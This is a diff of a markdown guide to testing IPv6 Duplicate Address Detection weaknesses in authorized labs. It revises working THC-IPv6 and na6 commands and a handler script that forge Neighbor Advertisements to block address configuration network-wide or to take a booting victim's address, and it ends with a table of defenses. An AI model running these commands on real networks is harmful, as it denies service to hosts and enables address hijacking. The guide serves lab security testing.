@@ -6,21 +6,21 @@ Tags: IPv6, DAD, Duplicate Address Detection, Security Testing, NDP, DoS
 
 Description: A guide to testing IPv6 Duplicate Address Detection (DAD) vulnerabilities including DAD DoS attacks and address theft in authorized lab environments.
 
-IPv6 Duplicate Address Detection (DAD) is a mechanism where a host checks whether a new IPv6 address it wants to use is already in use on the link. By sending a Neighbor Solicitation for the tentative address and listening for replies, DAD prevents address conflicts. However, DAD can be abused to prevent hosts from configuring addresses or to steal addresses.
+IPv6 Duplicate Address Detection (DAD) is a mechanism where a host checks whether a new IPv6 address it wants to use is already in use on the link. By sending a Neighbor Solicitation for the tentative address and listening for conflicting Neighbor Solicitations or Neighbor Advertisements, DAD prevents address conflicts. However, DAD can be abused to prevent hosts from configuring addresses or to steal addresses.
 
 **Warning**: Only test in authorized lab environments.
 
 ## How DAD Works
 
 ```text
-Host (configuring 2001:db8::10)
+Host (configuring tentative 2001:db8::10)
   |
-  |-- NS: "Is 2001:db8::10 in use?" --> ff02::1:ff00:10 (solicited-node multicast)
+  |-- NS (src ::, target 2001:db8::10) --> ff02::1:ff00:10 (solicited-node multicast)
   |
-  | (waits ~1 second)
+  | (waits RetransTimer, often ~1 second)
   |
-  | No response = address is unique, proceed
-  | NA response received = DUPLICATE, address not used
+  | No conflicting NS/NA = address is unique, proceed
+  | Conflicting NS or valid NA received = DUPLICATE, address not used
 ```
 
 ## DAD DoS Attack: Preventing Address Configuration
@@ -34,29 +34,33 @@ By responding to every DAD probe with a fake NA, an attacker can prevent any hos
 
 sudo dos-new-ip6 eth0
 
-# Target specific prefix
-sudo dos-new-ip6 eth0 2001:db8::/64
+# Alternative mode: send a conflicting NS instead of an NA
+sudo dos-new-ip6 -S eth0
 ```
 
 ### Method 2: fake_advertise6 (THC-IPv6)
 
 ```bash
-# Respond to DAD probes for a specific address (steal that address)
+# Advertise a specific address so DAD sees it as already in use
 sudo fake_advertise6 eth0 2001:db8::10
 
-# Make it appear the address is in use
-sudo fake_advertise6 -i eth0 2001:db8::10
+# Send a single NA instead of advertising continuously
+sudo fake_advertise6 -n 1 eth0 2001:db8::10
 ```
 
 ### Method 3: detect-new-ip6 + custom response
 
 ```bash
-# Monitor for DAD probes and respond
-sudo detect-new-ip6 eth0 | while read line; do
-  # Parse new address and send NA claiming it
-  addr=$(echo "$line" | awk '{print $1}')
-  sudo fake_advertise6 eth0 $addr
-done
+# Create a handler script:
+#   $1 = detected IPv6 address
+#   $2 = interface
+cat >/tmp/respond-dad.sh <<'EOF'
+#!/bin/sh
+fake_advertise6 -n 1 "$2" "$1"
+EOF
+
+chmod +x /tmp/respond-dad.sh
+sudo detect-new-ip6 eth0 /tmp/respond-dad.sh
 ```
 
 ## Address Theft via DAD
@@ -66,37 +70,37 @@ An attacker can "steal" a host's IPv6 address during DAD:
 ```bash
 # When victim boots and begins DAD for its address, claim it first
 # Monitor for DAD probes
-sudo tcpdump -i eth0 -n 'icmp6 and ip6[40] == 135'
+sudo tcpdump -i eth0 -n 'icmp6 and ip6[40] == 135 and src host ::'
 
 # When you see a NS with unspecified source (::) - it's a DAD probe
-# Quickly send NA claiming ownership of that address
-sudo fake_advertise6 eth0 <detected_tentative_address>
+# Quickly send a single NA claiming ownership of that address
+sudo fake_advertise6 -n 1 eth0 <detected_tentative_address>
 ```
 
-## SI6 Networks Approach with ns6 + na6
+## SI6 Networks Approach with na6
 
 ```bash
-# Send a fake NA in response to a DAD probe for 2001:db8::10
-# (simulates another host claiming ownership)
+# Send a DAD-conflicting NA for 2001:db8::10
+# (for DAD, the NA is multicast to ff02::1 and the Solicited flag stays clear)
 sudo na6 -i eth0 \
-  -s 2001:db8::10 \      # Source claiming ownership
-  -d ff02::1 \            # Send to all nodes
-  -t 2001:db8::10 \      # Target address
-  --solicited-flag \
-  --override
+  -s 2001:db8::10 \
+  -d ff02::1 \
+  -t 2001:db8::10 \
+  -o \
+  -e
 ```
 
 ## Monitoring DAD Activity
 
 ```bash
 # Watch for DAD probes (NS with source ::)
-sudo tcpdump -i eth0 -n -v 'icmp6 and ip6[40] == 135 and src == ::'
+sudo tcpdump -i eth0 -n -v 'icmp6 and ip6[40] == 135 and src host ::'
 
 # Monitor address configuration events
 sudo journalctl -f | grep -i "ipv6\|dad\|duplicate"
 
-# Check kernel DAD statistics
-cat /proc/net/snmp6 | grep -i "dad\|duplicate"
+# Check ICMPv6 neighbor discovery counters
+grep -E 'Icmp6(In|Out)Neighbor(Solicits|Advertisements)' /proc/net/snmp6
 ```
 
 ## Verifying DAD Settings
@@ -108,7 +112,7 @@ cat /proc/sys/net/ipv6/conf/eth0/dad_transmits
 # Disable DAD (not recommended for production)
 sudo sysctl -w net.ipv6.conf.eth0.dad_transmits=0
 
-# Standard value is 1 (one NS probe)
+# Use one DAD probe
 sudo sysctl -w net.ipv6.conf.eth0.dad_transmits=1
 ```
 
@@ -116,11 +120,11 @@ sudo sysctl -w net.ipv6.conf.eth0.dad_transmits=1
 
 | Defense | Implementation |
 |---|---|
-| SEND (RFC 3971) | Cryptographically signed NS/NA |
-| Secure DAD (SeND) | Prevents fake NA during DAD |
-| NDPMon | Detects DAD interference |
-| Port security | Limits which hosts can send NDP |
-| RA Guard + NDP Inspection | Switch-level filtering |
+| SEND (RFC 3971) | Cryptographically protects NDP, including DAD-related NS/NA |
+| Enhanced DAD (RFC 7527) | Adds a nonce to DAD NS to avoid false duplicate detection from looped-back NS; it does not stop forged NA |
+| NDPMon | Detects suspicious DAD / NDP activity |
+| Port security | Limits which hosts can send NDP on access ports |
+| IPv6 ND inspection / first-hop security | Switch-level validation and filtering of NS/NA |
 
 ```bash
 # Monitor for DAD failures in syslog
